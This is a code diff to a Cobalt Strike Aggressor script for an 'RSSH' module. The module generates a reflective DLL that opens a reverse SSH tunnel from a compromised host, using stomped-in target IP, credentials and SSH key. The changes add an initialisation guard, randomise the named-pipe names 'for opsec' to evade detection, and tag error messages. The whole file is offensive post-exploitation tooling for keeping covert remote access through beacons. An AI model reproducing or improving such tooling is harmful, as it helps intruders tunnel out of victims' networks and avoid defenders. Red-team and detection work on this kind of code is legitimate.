@@ -1,8 +1,10 @@
 import beacon.CommandBuilder;
 
-global('$ssh_inited $pipe_wait $error_1 $ssh_key_stomp_me $usage $rssh_dll_name $bof_write_pipe_name $reading_inited $pipe_output_name_final $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
+global('$ssh_inited $pipe_wait $error_1 $ssh_key_stomp_me $artifacts_inited $usage $rssh_dll_name $bof_write_pipe_name $reading_inited $pipe_output_name_final $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
 $ssh_inited = -1;
 $reading_inited = -1;
+$artifacts_inited = -1;
+
 $pipe_output_name_final = "BigGasPipe_updater_01_"; # Change the pipe name an reload the CNA for 'opsec', 25-bytes MAX
 $pipe_input_name_final = "BigGasPipe_updater_02_"; # Change the pipe name an reload the CNA for 'opsec', 25-bytes MAX
 
@@ -90,8 +92,13 @@ alias rssh-generate-client {
     $target_ssh_key_path = $4;
 
     if($target_ip is $null || $target_username is $null || $target_ssh_key_path is $null){
-        berror($beacon_id , "Invalid arguments");
+        berror($beacon_id , "[RSSH] Invalid arguments");
         return;
+    }
+
+    if($artifacts_inited > 0){
+        berror($beacon_id , "[RSSH] Artifacts already initialized.");
+        return; 
     }
 
     # Get current beacon info
@@ -101,6 +108,10 @@ alias rssh-generate-client {
         berror($beacon_id , "[RSSH] This script only supports x64 processes");
         return;
     }
+
+    # Add random number to the pipe names
+    $pipe_input_name_final = append_random($pipe_input_name_final);
+    $pipe_output_name_final = append_random($pipe_output_name_final);
 
     # Build rdll path; This needs rework if you want to support x86 for whatever reason
     # The server must have the interface IP, PORT, username, password, input pipe and outputpipe names stomped in 
@@ -178,6 +189,8 @@ alias rssh-generate-client {
 
     # Close handle
     closef($handle);
+
+    $artifacts_inited = 1;
 
     println("[RSSH] RSSH dll" . $rssh_dll_name . " generated into " . getFileProper(script_resource(".")) . "out" . " directory.");
 }
@@ -341,7 +354,7 @@ alias rssh-init {
     }
 
     if($target_ip is $null || $target_username is $null || $target_password is $null){
-        berror($beacon_id , "Invalid arguments");
+        berror($beacon_id , "[RSSH] Invalid arguments");
         return;
     }
 
